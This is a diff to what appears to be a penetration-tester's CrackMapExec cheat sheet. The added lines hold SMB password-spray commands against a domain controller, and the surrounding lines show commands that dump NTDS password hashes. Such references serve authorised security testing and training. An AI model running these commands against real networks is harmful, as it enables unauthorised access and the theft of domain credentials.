@@ -100,4 +100,15 @@ crackmapexec smb <ip> -u <user> -p <password> -d <domain> --ntds
 crackmapexec smb <ip> -u <user> -p <password> -d <domain> --ntds-history
 ```
 
+## crackmap exec - password spray (user=password)
+```
+cme smb <dc-ip> -u <user.txt> -p <password.txt> --no-bruteforce
+```
+
+## crackmap exec - password spray multiple test (carrefull on lockout)
+```
+cme smb <dc-ip> -u <user.txt> -p <password.txt>
+```
+
+
 = ip: 192.168.1.0/24
